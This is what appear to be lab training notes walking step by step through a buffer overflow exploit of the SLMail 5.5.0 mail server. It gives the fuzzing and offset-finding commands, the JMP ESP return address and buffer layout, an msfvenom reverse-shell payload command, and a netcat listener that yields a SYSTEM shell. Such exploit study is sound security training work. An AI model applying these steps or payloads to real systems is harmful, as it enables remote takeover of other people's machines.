SLMail 5.5.0 Mail Server Buffer Overflow Exploit


Procedure:

1) Craft a fuzzing script with A's, such as SLMail5_fuzzer1.py
2) Start SLMail and attach it to Immunity Debugger
3) In your attacking machine: python SLMail5_fuzzer1.py
4) In Immunity Debugger (ID): 
Notice that EIP contains our A's; ESP does as well.
Notice that this happened when we were sending around 2700 bytes.

'''
Let's replicate the crash to determine the precise offset to control EIP.
By controlling EIP we can point the program to any area we want, such as 
shellcode on the stack.
'''

5) locate pattern_create
6) /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
# This script creates a unique pattern
7) Insert the pattern into an attacking script, such as SLMail5_attack1.py
8) Repeat steps #2 and #3
9) In ID: Notice that the program crashes with our pattern -> Copy EIP
10) /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438
# This script locates the offset
# Notice: [*] Exact match at offset 2606

11) Modify the buffer in our attacking script. Replace the pattern with:
('A' * 2606) + ('B' * 4) + ('C' * 90)

12) Repeat steps #2 and #3
13) In ID: Notice that EIP now contains our B's and that ESP now contains our C's.
'''
If you look at ESP's address (0x024FA12B) you will see that it points directly to 
the start of our C's.
This means we control EIP and that we can replace the C's with shellcode.
A reverse shell is the perfect candidate.
'''

14) To figure out how much space we have for the shellcode, modify the attacking script's buffer with: ('A' * 2606) + ('B' * 4) + ('C' * (3500 - 2606 - 4))
15) Repeat steps #2 and #3
# From the previous 74 bytes of space we thought we had, we now discover we have 
# a total of 424 bytes of free space available for our shellcode

16) To check for bad characters, we modify our buffer and replace our C's with all possible characters, from 0x00 to 0xff, and test how the program handles the characters - with which it gets truncated. 
We remove the character and then repeat, until we have discovered all bad characters.
# Another way is to search online for bad characters for a specific program
# See SLMail5_fuzzer2.py
# The resulting bad characters in this case are: 0x00, 0x0A, 0x0D

'''
Instead of hard-coding the return address to replace our B's with, we will use a more reliable way. 
We are going to use an accessible and reliable address is memory that contains an insutrction such as JMP ESP, so that we may always jump to the address pointed to by the ESP register.

We will choose a module that: 
1) Has no memory protections such as DEP and ASLR
2) Has a memory range that doesn't contain bad characters

'''

17) In ID: !mona modules
'''
Notice that the SLMCF.DLL is not affected by any memory protection schemes and is not rebased on each reboot
This DLL will always reliably load to the same address

If this application was compiled with DEP support, our JMP ESP address would have to  be located in the code (.text) segment of the module, as that is the only segment with  
both Read (R) and Executable (E) permissions.

However, since no DEP is enabled, we are free to use instructions from any address in this module.
'''

18) In ID: !mona assemble -s "jmp esp"
# We get the opcode equivalent to JMP ESP, in this case: \xff\xe4

19) In ID: !mona find -s "\xff\xe4" -m slmfc.dll
# Searching for the opcode in all sections of the module

20) In ID: !mona info -a 5f4a358f
# Verifying that our chosen address works and doesn't contain bad characters
# It works! So we will be using this address for EIP, so that the JMP ESP will be 
# executed and land on our shellcode

21) To confirm that our chosen JMP ESP instruction works, modify the buffer of the attack script to: 
buffer =  "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390

22) Set a breakpoint in ID on the return address

23) Repeat steps #2 and #3
# Notice when the breakpoint gets hit that the program reaches our JMP ESP instruction

24) msfvenom -p windows/shell_reverse_tcp -b '\x00\x0d\x0a' EXITFUNC=thread LHOST=192.168.0.117 LPORT=443 -f python
'''
-p : payload to use
-b : bad characters to avoid
-f : output format
EXITFUNC : way to exit our operation

The default EXITFUNC is ExitProcess, which kills the whole program after exiting. 
To avoid crashing and killing the whole program we need to use an appropriate exit method.
In this case, since we are exploiting a threaded application, we use an Exit Thread method. This will just exit the affected thread of the program, meaning this allows us to exploit the program without bringing the whole service down.

'''

25) Modify the attack script, such as SLMail5_exploit.py, with the following:
<paste the msfvenom-generated shellcode>
payload = "A" * 2606 + "\x8f\x35\x4a\x5f" + ("\x90" * 8) + buffer

26)  nc --nlvp 443
# Setting up a netcat listener on port 443

27) python SLMail5_exploit.py
28) whoami
# We get system on our Windows 7 victim
# We have effectively compromised the system

